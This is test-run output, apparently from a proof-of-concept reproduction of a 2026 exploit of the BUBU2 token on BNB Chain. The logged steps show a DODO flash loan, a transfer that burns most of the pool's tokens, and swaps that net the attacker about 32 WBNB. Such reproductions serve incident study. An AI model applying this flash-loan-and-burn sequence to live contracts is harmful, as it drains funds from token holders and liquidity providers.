```
Ran 1 test for test/2026-03/BUBU2/BUBU2_exploit.t.sol:ContractBUBU2_Exploit
[PASS] test_bubuExploit() (gas: 644594)
Logs:
  ------------------------------------------------------------------------
  [START] Attacker EOA WBNB Balances: 0.099074355704571107
  [START] Attacker EOA BUBU2 Balances: 0.000000000000000000
  ------------------------------------------------------------------------
  |
  1. Call the flashLoan from DODO
  decode tryData:  18400000000000000000 0x10ED43C718714eb63d5aA57B78B54704E256024E
  decode tryData third and forth data:  0x3fF3f18b5C113fAC5E81b43f80Bf438B99EdEE52 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
  params callback:  0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496 18400000000000000000 0
  |
  2. launch the callback with `DPPFlashLoanCall`
  reserves before       swap:  1672987631874275939459435668 63678088126664092303
  |
  3. Swap Borrowed WBNB into BUBU2
  |
  4. Transfer to this contract 1000token to trigger the exploit --> which burned 99% of the LP
  |
  5. After the trigger already called and the BUBU2 token from the LP already inflated, the attacker swap it back into WBNB
  reserves after first  swap:  6493352558136414038293095 82078088126664092303
  reserves after second swap:  25209208570486070628333930 21185573909446518114
  |
  6. The total extracted WBNB ==> 50WBNB , return 18,4 WBNB to DODO and the Attacker take the profit approx 32 WBNB
  |
  ------------------------------------------------------------------------
  [FINISH] Attacker EOA WBNB Balances: 32.275435839307229860
  [FINISH] Attacker EOA BUBU2 Balances: 0.000000000000000000
  ------------------------------------------------------------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.54s (5.86ms CPU time)

Ran 1 test suite in 1.55s (1.54s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```